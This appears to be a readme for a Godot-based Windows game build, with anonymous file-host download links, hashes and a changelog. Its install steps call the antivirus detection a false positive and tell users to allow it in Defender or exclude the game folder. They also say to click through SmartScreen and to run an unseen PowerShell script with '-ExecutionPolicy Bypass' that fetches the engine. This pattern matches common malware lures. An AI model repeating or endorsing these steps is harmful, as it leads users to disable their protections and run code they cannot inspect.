Empires of Olympus — Windows 10 / 11
====================================

This build fixes enemy chase facing (minotaur/satyr/gorgon/harpy) and
restores textured plaza NPCs (oracle, guards, merchants, townsfolk, smith).

------------------------------------------------------------
Windows Defender / "virus detected"
------------------------------------------------------------
FALSE POSITIVE. EmpiresOfOlympus.exe is the stock Godot 4.4.1 Windows
export template (same SHA-256 as Godot’s official windows_release_x86_64.exe):

  b493c1d53fb915f7805f360cfe42d1c3126e720dfc234a4b0f2feb99200f9a4b

If you already made an exclusion for an older .exe, keep using that folder
and replace the files with this build.

Allow steps: Windows Security → Protection history → Allow on this device
Or exclude e.g. C:\Games\EmpiresOfOlympus\

------------------------------------------------------------
Download A — data-only (recommended)
------------------------------------------------------------
  https://gofile.io/d/BgE1qK2B
  EmpiresOfOlympus-data-only.zip
  SHA-256: 4375ca3bf7b8ebe04ffe3a4357a1a97eb934f474939108c4d1bb9b9229ac893a

1. Extract to C:\Games\EmpiresOfOlympus\
2. powershell -ExecutionPolicy Bypass -File .\GET-ENGINE.ps1
3. Run EmpiresOfOlympus.exe (keep next to EmpiresOfOlympus.pck)

Pck SHA-256: 71c1365656f9a30fdbf85180ddf7c60811296660b04710c9cde57dca0dcf1b02

------------------------------------------------------------
Download B — full zip
------------------------------------------------------------
  https://gofile.io/d/PIUbZAh4
  EmpiresOfOlympus-windows.zip
  SHA-256: 4df19de293a0a153ac3901b44a4974103502643d8f8210beeaaa3940056c3ccf

Extract exe + pck into the same folder and run the exe.

------------------------------------------------------------
SmartScreen
------------------------------------------------------------
More info → Run anyway. Or Properties → Unblock.

------------------------------------------------------------
What’s in this build
------------------------------------------------------------
- Facing: UAL humanoids aim chest +Z (Unity front) at chase direction
- Plaza: textured oracle_priestess / city_guard / citizen_merchant /
  citizen_woman / blacksmith_npc with idle/talk animations
- Hoplite Chan, bone centaur, multiplayer/chat/accounts
